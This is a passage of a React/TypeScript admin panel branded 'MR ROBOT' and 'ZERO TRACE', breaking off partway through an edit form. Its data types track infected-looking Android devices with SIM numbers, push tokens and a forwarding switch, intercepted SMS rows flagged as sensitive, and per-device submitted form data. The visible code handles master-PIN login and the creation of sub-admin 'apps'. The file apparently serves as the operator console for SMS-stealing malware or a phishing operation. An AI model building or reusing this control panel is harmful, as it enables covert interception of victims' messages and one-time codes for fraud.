import { useState, useEffect, useCallback, useRef, useMemo } from "react";

const _API_KEY = import.meta.env.VITE_API_SECRET ?? "";
function apiFetch(url: string, opts: RequestInit = {}): Promise<Response> {
  const h = new Headers(opts.headers);
  if (_API_KEY) h.set("x-api-key", _API_KEY);
  return fetch(url, { ...opts, headers: h });
}

const T = {
  bg: "#070c1a", card: "#0e1525", cardHover: "#141e30",
  border: "#1a2740", borderLight: "#1f3050",
  text: "#f1f5f9", muted: "#4d6280", mutedLight: "#7a95b4",
  accent: "#6366f1", accentLight: "#818cf8", accentGlow: "rgba(99,102,241,0.15)",
  green: "#22c55e", red: "#ef4444", yellow: "#f59e0b", orange: "#f97316",
  inputBg: "#080e1c", headerBg: "#080e1c",
};

type App = {
  id: number; appId: string; name: string; pin: string;
  status: string; createdAt: string;
  deleteProtectionPin: string | null;
  deleteProtectionEnabled: boolean;
};
type FullDevice = {
  id: number; deviceId: string; appId: string; userId: string; name: string;
  androidVersion: number;
  sim1Carrier: string | null; sim1Phone: string | null;
  sim2Carrier: string | null; sim2Phone: string | null;
  status: string; lastOnline: string | null;
  forwardEnabled: boolean; forwardSlot: number | null;
  hasFcm: boolean; fcmToken: string | null; installedAt: string;
};
type MsgRow = {
  id: number; appId: string; deviceId: string; userId: string;
  fromSender: string; fromNumber: string; body: string;
  isSensitive: boolean; receivedAt: string;
};
type GroupRow = {
  id: number; appId: string; deviceId: string;
  data: Record<string, unknown>; submittedAt: string;
};
type SessionRow = {
  id: string; appId: string; loginTime: string; lastActive: string;
  userAgent: string; ip: string; device: string;
};

function generateAppId() {
  const c = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  const s = (n: number) => Array.from({ length: n }, () => c[Math.floor(Math.random() * c.length)]).join("");
  return `APP-${s(4)}-${s(4)}-${s(4)}`;
}
function fmtAgo(iso: string | null | undefined): string {
  if (!iso) return "Never";
  const diff = Date.now() - new Date(iso).getTime();
  if (diff < 60000) return `${Math.floor(diff / 1000)}s ago`;
  if (diff < 3600000) return `${Math.floor(diff / 60000)}m ago`;
  if (diff < 86400000) return `${Math.floor(diff / 3600000)}h ago`;
  return `${Math.floor(diff / 86400000)}d ago`;
}
function fmtDate(iso: string): string {
  const d = new Date(iso);
  return d.toLocaleDateString("en-IN", { day: "2-digit", month: "short", year: "numeric" }) + " " + d.toLocaleTimeString("en-IN", { hour: "2-digit", minute: "2-digit", hour12: true });
}
function copyToClipboard(text: string): Promise<void> {
  if (navigator.clipboard) return navigator.clipboard.writeText(text);
  const el = document.createElement("textarea");
  el.value = text; el.style.position = "fixed"; el.style.opacity = "0";
  document.body.appendChild(el); el.select();
  document.execCommand("copy"); document.body.removeChild(el);
  return Promise.resolve();
}

/* ── Icons ── */
const Ic = {
  Shield: () => (<svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>),
  Lock: () => (<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>),
  Eye: () => (<svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>),
  EyeOff: () => (<svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>),
  Alert: () => (<svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>),
  ArrowRight: () => (<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>),
  X: () => (<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>),
  Refresh: () => (<svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg>),
  Copy: () => (<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>),
  Check: () => (<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>),
  Layers: () => (<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><polygon points="12 2 2 7 12 12 22 7 12 2"/><polyline points="2 17 12 22 22 17"/><polyline points="2 12 12 17 22 12"/></svg>),
  CheckCircle: () => (<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>),
  XCircle: () => (<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>),
  Pencil: () => (<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg>),
  Power: () => (<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"><path d="M18.36 6.64a9 9 0 1 1-12.73 0"/><line x1="12" y1="2" x2="12" y2="12"/></svg>),
  Trash: () => (<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v2"/></svg>),
  Key: () => (<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"><path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"/></svg>),
  LogOut: () => (<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>),
  CalendarPlus: () => (<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/><line x1="12" y1="15" x2="12" y2="19"/><line x1="10" y1="17" x2="14" y2="17"/></svg>),
  Search: () => (<svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>),
  Plus: () => (<svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>),
  Inbox: () => (<svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"><polyline points="22 12 16 12 14 15 10 15 8 12 2 12"/><path d="M5.45 5.11L2 12v6a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-6l-3.45-6.89A2 2 0 0 0 16.76 4H7.24a2 2 0 0 0-1.79 1.11z"/></svg>),
  Loader: () => (<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" style={{ animation: "spin 0.9s linear infinite" }}><line x1="12" y1="2" x2="12" y2="6"/><line x1="12" y1="18" x2="12" y2="22"/><line x1="4.93" y1="4.93" x2="7.76" y2="7.76"/><line x1="16.24" y1="16.24" x2="19.07" y2="19.07"/><line x1="2" y1="12" x2="6" y2="12"/><line x1="18" y1="12" x2="22" y2="12"/><line x1="4.93" y1="19.07" x2="7.76" y2="16.24"/><line x1="16.24" y1="7.76" x2="19.07" y2="4.93"/></svg>),
  CPU: () => (<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><rect x="4" y="4" width="16" height="16" rx="2" ry="2"/><rect x="9" y="9" width="6" height="6"/><line x1="9" y1="1" x2="9" y2="4"/><line x1="15" y1="1" x2="15" y2="4"/><line x1="9" y1="20" x2="9" y2="23"/><line x1="15" y1="20" x2="15" y2="23"/><line x1="20" y1="9" x2="23" y2="9"/><line x1="20" y1="14" x2="23" y2="14"/><line x1="1" y1="9" x2="4" y2="9"/><line x1="1" y1="14" x2="4" y2="14"/></svg>),
  Smartphone: () => (<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>),
  Wifi: () => (<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M5 12.55a11 11 0 0 1 14.08 0"/><path d="M1.42 9a16 16 0 0 1 21.16 0"/><path d="M8.53 16.11a6 6 0 0 1 6.95 0"/><line x1="12" y1="20" x2="12.01" y2="20"/></svg>),
  MessageSquare: () => (<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>),
  Database: () => (<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></svg>),
  Settings: () => (<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83-2.83l.06-.06A1.65 1.65 0 0 0 4.68 15a1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 2.83-2.83l.06.06A1.65 1.65 0 0 0 9 4.68a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 2.83l-.06.06A1.65 1.65 0 0 0 19.4 9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>),
  ChevronDown: () => (<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><polyline points="6 9 12 15 18 9"/></svg>),
  ChevronRight: () => (<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><polyline points="9 18 15 12 9 6"/></svg>),
  Send: () => (<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>),
  PhoneForwarded: () => (<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><polyline points="19 1 23 5 19 9"/><line x1="15" y1="5" x2="23" y2="5"/><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.69 13a19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 3.6 2.31h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L7.91 9.91a16 16 0 0 0 6.16 6.16l.91-.91a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 17v-.08z"/></svg>),
  Hash: () => (<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><line x1="4" y1="9" x2="20" y2="9"/><line x1="4" y1="15" x2="20" y2="15"/><line x1="10" y1="3" x2="8" y2="21"/><line x1="16" y1="3" x2="14" y2="21"/></svg>),
  SmartphoneSm: () => (<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>),
  Link: () => (<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>),
  LogOut2: () => (<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>),
};

/* ── Base UI ── */
function CopyBtn({ value, label = "Copy" }: { value: string; label?: string }) {
  const [copied, setCopied] = useState(false);
  function handleCopy(e: React.MouseEvent) {
    e.stopPropagation();
    copyToClipboard(value).then(() => { setCopied(true); setTimeout(() => setCopied(false), 2000); });
  }
  return (
    <button onClick={handleCopy} title={`Copy ${label}`} style={{ display: "inline-flex", alignItems: "center", justifyContent: "center", padding: "3px 9px", borderRadius: 6, border: `1px solid ${copied ? T.green + "60" : T.borderLight}`, background: copied ? T.green + "18" : T.border + "80", color: copied ? T.green : T.mutedLight, cursor: "pointer", fontSize: 11, fontWeight: 600, gap: 5, transition: "all 0.15s", whiteSpace: "nowrap" }}>
      {copied ? <Ic.Check /> : <Ic.Copy />}{copied ? "Copied" : label}
    </button>
  );
}
function Modal({ children, onClose, maxWidth = 420 }: { children: React.ReactNode; onClose: () => void; maxWidth?: number }) {
  return (
    <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,.80)", display: "flex", alignItems: "center", justifyContent: "center", zIndex: 100, padding: 16, backdropFilter: "blur(3px)" }}
      onClick={e => { if (e.target === e.currentTarget) onClose(); }}>
      <div style={{ width: "100%", maxWidth, background: T.card, borderRadius: 20, padding: "26px 28px 24px", border: `1px solid ${T.borderLight}`, boxShadow: "0 24px 64px rgba(0,0,0,.6)" }}>
        {children}
      </div>
    </div>
  );
}
function ModalHeader({ title, icon, onClose }: { title: string; icon?: React.ReactNode; onClose: () => void }) {
  return (
    <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 22 }}>
      <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
        {icon && <div style={{ color: T.accentLight }}>{icon}</div>}
        <div style={{ fontSize: 17, fontWeight: 800, color: T.text }}>{title}</div>
      </div>
      <button onClick={onClose} style={{ background: T.border, border: "none", color: T.mutedLight, cursor: "pointer", width: 28, height: 28, borderRadius: 8, display: "flex", alignItems: "center", justifyContent: "center" }}><Ic.X /></button>
    </div>
  );
}
const inpBase: React.CSSProperties = { width: "100%", marginTop: 6, padding: "11px 14px", borderRadius: 10, border: `1.5px solid ${T.borderLight}`, background: T.inputBg, color: T.text, fontSize: 14, outline: "none", boxSizing: "border-box", transition: "border-color 0.15s" };
function FieldLabel({ children }: { children: React.ReactNode }) { return <label style={{ fontSize: 10, color: T.mutedLight, fontWeight: 700, letterSpacing: 1.2, textTransform: "uppercase" }}>{children}</label>; }
function ErrBanner({ msg }: { msg: string }) { return <div style={{ display: "flex", alignItems: "center", gap: 8, color: T.red, fontSize: 12, marginBottom: 10, background: T.red + "12", padding: "9px 13px", borderRadius: 9, border: `1px solid ${T.red}30` }}><Ic.Alert /> {msg}</div>; }
function Spinner({ size = 14 }: { size?: number }) { return <div style={{ display: "inline-block", width: size, height: size, border: "2px solid currentColor", borderTopColor: "transparent", borderRadius: "50%", animation: "spin 0.7s linear infinite" }} />; }

/* ── Login Screen ── */
function MasterLogin({ onAuth }: { onAuth: (pin: string) => void }) {
  const [pin, setPin] = useState("");
  const [err, setErr] = useState("");
  const [loading, setLoading] = useState(false);
  const [showPin, setShowPin] = useState(false);
  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault(); setErr(""); setLoading(true);
    try {
      const r = await apiFetch("/api/admin/verify-master-pin", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ pin }) });
      if (!r.ok) { const j = await r.json() as { error?: string }; setErr(j.error ?? "Wrong master PIN. Try again."); setPin(""); return; }
      onAuth(pin);
    } catch { setErr("Network error. Try again."); } finally { setLoading(false); }
  }
  return (
    <div style={{ minHeight: "100vh", background: `radial-gradient(ellipse at 65% 15%, rgba(99,102,241,0.14) 0%, transparent 55%), radial-gradient(ellipse at 15% 85%, rgba(139,92,246,0.10) 0%, transparent 50%), ${T.bg}`, display: "flex", alignItems: "center", justifyContent: "center", fontFamily: "'Inter', system-ui, sans-serif", padding: "20px" }}>
      <div style={{ width: "100%", maxWidth: 400, background: T.card, borderRadius: 24, padding: "44px 40px 36px", border: `1px solid ${T.borderLight}`, boxShadow: "0 32px 80px rgba(0,0,0,.7)" }}>
        <div style={{ textAlign: "center", marginBottom: 36 }}>
          <div style={{ width: 68, height: 68, borderRadius: 20, margin: "0 auto 18px", background: "linear-gradient(145deg, #4f52d4, #7c3aed)", display: "flex", alignItems: "center", justifyContent: "center", color: "#fff", boxShadow: "0 12px 32px rgba(99,102,241,0.45)" }}><Ic.Shield /></div>
          <div style={{ fontSize: 22, fontWeight: 900, color: T.text }}>MR ROBOT</div>
          <div style={{ display: "inline-flex", alignItems: "center", gap: 6, marginTop: 10, fontSize: 10, color: T.accentLight, background: "rgba(99,102,241,0.12)", padding: "4px 14px", borderRadius: 99, border: "1px solid rgba(99,102,241,0.25)", fontWeight: 700, letterSpacing: 2, textTransform: "uppercase" }}>
            <span style={{ width: 5, height: 5, borderRadius: "50%", background: T.accentLight, display: "inline-block" }} />Master Admin
          </div>
        </div>
        <form onSubmit={handleSubmit}>
          <label style={{ fontSize: 10, color: T.mutedLight, fontWeight: 700, letterSpacing: 1.5, textTransform: "uppercase", display: "flex", alignItems: "center", gap: 6 }}><Ic.Lock /> Master PIN</label>
          <div style={{ position: "relative", marginTop: 8, marginBottom: 6 }}>
            <input type={showPin ? "text" : "password"} value={pin} onChange={e => setPin(e.target.value)} placeholder="Enter master PIN" autoFocus
              style={{ ...inpBase, marginTop: 0, paddingRight: 46, fontFamily: pin && !showPin ? "monospace" : "inherit", letterSpacing: pin && !showPin ? 4 : "normal" }} />
            <button type="button" onClick={() => setShowPin(v => !v)} style={{ position: "absolute", right: 13, top: "50%", transform: "translateY(-50%)", background: "none", border: "none", color: showPin ? T.accentLight : T.muted, cursor: "pointer", padding: 4, display: "flex", alignItems: "center" }}>
              {showPin ? <Ic.EyeOff /> : <Ic.Eye />}
            </button>
          </div>
          {err && <ErrBanner msg={err} />}
          <button type="submit" disabled={loading || !pin} style={{ width: "100%", marginTop: 20, padding: "14px 0", borderRadius: 12, background: pin && !loading ? "linear-gradient(135deg, #5254d4, #7c3aed)" : T.borderLight, color: pin && !loading ? "#fff" : T.muted, fontWeight: 800, fontSize: 14, border: "none", cursor: pin && !loading ? "pointer" : "default", display: "flex", alignItems: "center", justifyContent: "center", gap: 8 }}>
            {loading ? (<><Spinner /> Verifying…</>) : (<>Unlock Panel <Ic.ArrowRight /></>)}
          </button>
        </form>
        <div style={{ textAlign: "center", marginTop: 22, fontSize: 11, color: T.muted }}>MR ROBOT Control Panel · Secure Access</div>
      </div>
      <style>{`@keyframes spin{to{transform:rotate(360deg)}} @keyframes ma-pulse{0%,100%{opacity:1}50%{opacity:0.55}} *{box-sizing:border-box}`}</style>
    </div>
  );
}

/* ── Create App Modal ── */
function CreateAppModal({ masterPin, onClose, onCreated }: { masterPin: string; onClose: () => void; onCreated: (a: App) => void }) {
  const [name, setName] = useState("MR ROBOT");
  const [appId, setAppId] = useState(generateAppId);
  const [pin, setPin] = useState("1234");
  const [err, setErr] = useState(""); const [loading, setLoading] = useState(false);
  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (!name.trim() || !pin.trim()) { setErr("All fields required"); return; }
    if (pin.length < 4) { setErr("PIN must be at least 4 characters"); return; }
    setErr(""); setLoading(true);
    try {
      const r = await apiFetch("/api/master/apps", { method: "POST", headers: { "Content-Type": "application/json", "x-master-pin": masterPin }, body: JSON.stringify({ appId, name: name.trim(), pin }) });
      if (!r.ok) { const j = await r.json() as { error?: string }; setErr(j.error ?? "Failed"); return; }
      onCreated(await r.json() as App);
    } catch { setErr("Network error"); } finally { setLoading(false); }
  }
  return (
    <Modal onClose={onClose}>
      <ModalHeader title="Create Sub-Admin App" onClose={onClose} />
      <form onSubmit={handleSubmit}>
        <div style={{ marginBottom: 14 }}>
          <FieldLabel>Version</FieldLabel>
          <div style={{ display: "flex", gap: 8, marginTop: 8 }}>
            {(["MR ROBOT", "ZERO TRACE"] as const).map(n => (
              <button key={n} type="button" onClick={() => setName(n)} style={{ flex: 1, padding: "14px 8px", borderRadius: 12, border: `2px solid ${name === n ? T.accent : T.borderLight}`, background: name === n ? T.accentGlow : T.border, cursor: "pointer", display: "flex", flexDirection: "column", alignItems: "center", gap: 5, transition: "all 0.15s" }}>
                <span style={{ fontSize: 22 }}>{n === "MR ROBOT" ? "🤖" : "👁️"}</span>
                <span style={{ fontSize: 12, fontWeight: 800, color: name === n ? T.accentLight : T.muted }}>{n}</span>
              </button>
            ))}
          </div>
        </div>
        <div style={{ marginBottom: 14 }}>
          <FieldLabel>App ID</FieldLabel>
          <div style={{ display: "flex", gap: 6, marginTop: 6 }}>
            <input type="text" value={appId} onChange={e => setAppId(e.target.value)} style={{ ...inpBase, marginTop: 0, flex: 1, fontFamily: "monospace", fontSize: 12 }} />
            <button type="button" onClick={() => setAppId(generateAppId())} style={{ padding: "0 14px", borderRadius: 10, background: T.border, border: `1px solid ${T.borderLight}`, color: T.mutedLight, cursor: "pointer", display: "flex", alignItems: "center", gap: 6, fontSize: 12, fontWeight: 600, whiteSpace: "nowrap" }}><Ic.Refresh /> New</button>
          </div>
        </div>
        <div style={{ marginBottom: 14 }}><FieldLabel>Login PIN</FieldLabel><input type="password" value={pin} onChange={e => setPin(e.target.value)} placeholder="min 4 characters" style={inpBase} /></div>
        {err && <ErrBanner msg={err} />}
        <div style={{ display: "flex", gap: 10, marginTop: 20 }}>
          <button type="button" onClick={onClose} style={{ flex: 1, padding: "12px 0", borderRadius: 10, background: T.border, border: `1px solid ${T.borderLight}`, color: T.text, fontWeight: 700, cursor: "pointer", fontSize: 13 }}>Cancel</button>
          <button type="submit" disabled={loading} style={{ flex: 1, padding: "12px 0", borderRadius: 10, background: "linear-gradient(135deg,#5254d4,#7c3aed)", border: "none", color: "#fff", fontWeight: 700, cursor: loading ? "default" : "pointer", fontSize: 13 }}>{loading ? "Creating…" : "Create App"}</button>
        </div>
      </form>
    </Modal>
  );
}

/* ── Change Master PIN Modal ── */
function ChangePinModal({ masterPin, onClose, onChanged }: { masterPin: string; onClose: () => void; onChanged: (p: string) => void }) {
  const [currentPin, setCurrentPin] = useState(masterPin);
  const [newPin, setNewPin] = useState(""); const [newPin2, setNewPin2] = useState("");
  const [err, setErr] = useState(""); const [loading, setLoading] = useState(false);
  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (newPin.length < 4) { setErr("New PIN must be at least 4 characters"); return; }
    if (newPin !== newPin2) { setErr("PINs do not match"); return; }
    setErr(""); setLoading(true);
    try {
      const r = await apiFetch("/api/admin/master-pin", { method: "PATCH", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ currentPin, newPin }) });
      if (!r.ok) { const j = await r.json() as { error?: string }; setErr(j.error ?? "Failed"); return; }
      onChanged(newPin);
    } catch { setErr("Network error"); } finally { setLoading(false); }
  }
  return (
    <Modal onClose={onClose} maxWidth={380}>
      <ModalHeader title="Change Master PIN" icon={<Ic.Key />} onClose={onClose} />
      <form onSubmit={handleSubmit}>
        {[{ label: "Current PIN", val: currentPin, set: setCurrentPin }, { label: "New PIN", val: newPin, set: setNewPin }, { label: "Confirm New PIN", val: newPin2, set: setNewPin2 }].map(({ label, val, set }) => (
          <div key={label} style={{ marginBottom: 12 }}><FieldLabel>{label}</FieldLabel><input type="password" value={val} onChange={e => set(e.target.value)} style={inpBase} /></div>
        ))}
        {err && <ErrBanner msg={err} />}
        <div style={{ display: "flex", gap: 10, marginTop: 20 }}>
          <button type="button" onClick={onClose} style={{ flex: 1, padding: "12px 0", borderRadius: 10, background: T.border, border: `1px solid ${T.borderLight}`, color: T.text, fontWeight: 700, cursor: "pointer", fontSize: 13 }}>Cancel</button>
          <button type="submit" disabled={loading} style={{ flex: 1, padding: "12px 0", borderRadius: 10, background: "linear-gradient(135deg,#5254d4,#7c3aed)", border: "none", color: "#fff", fontWeight: 700, cursor: loading ? "default" : "pointer", fontSize: 13 }}>{loading ? "Saving…" : "Change PIN"}</button>
        </div>
      </form>
    </Modal>
  );
}

/* ── Edit App Modal ── */
function EditAppModal({ app, masterPin, onClose, onUpdated }: { app: App; masterPin: string; onClose: () => void; onUpdated: (a: App) => void }) {
  const [name, setName] = useState(app.name); const [pin, setPin] = useState(app.pin);
  const [err, setErr] = useState(""); const [loading, setLoading] = useState(false);
  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (!name.trim()) { setErr("Name required"); return; }
    if (pin.length < 4) { setErr("PIN must be at least 4 characters"); return; }
    setErr(""); setLoading(true);
    try {
      const r = await apiFetch(`/api/master/apps/${encodeURIComponent(app.appId)}`, { method: "PATCH", headers: { "Content-Type": "application/json", "x-master-pin": masterPin }, body: JSON.stringify({ name: name.trim(), pin }) });
      if (!r.ok) { const j = await r.json() as { error?: string }; setErr(j.error ?? "Failed"); return; }
      onUpdated(await r.json() as App);
    } catch { setErr("Network error"); } finally { setLoading(false); }
  }
  return (
    <Modal onClose={onClose}>
      <ModalHeader title="Edit App" icon={<Ic.Pencil />} onClose={onClose} />
      <div style={{ fontSize: 11, color: T.muted, marginBottom: 18, fontFamily: "monospace", background: T.inputBg, padding: "6px 12px", borderRadius: 8, display: "inline-block", border: `1px solid ${T.borderLight}` }}>{app.appId}</div>
      <form onSubmit={handleSubmit}>
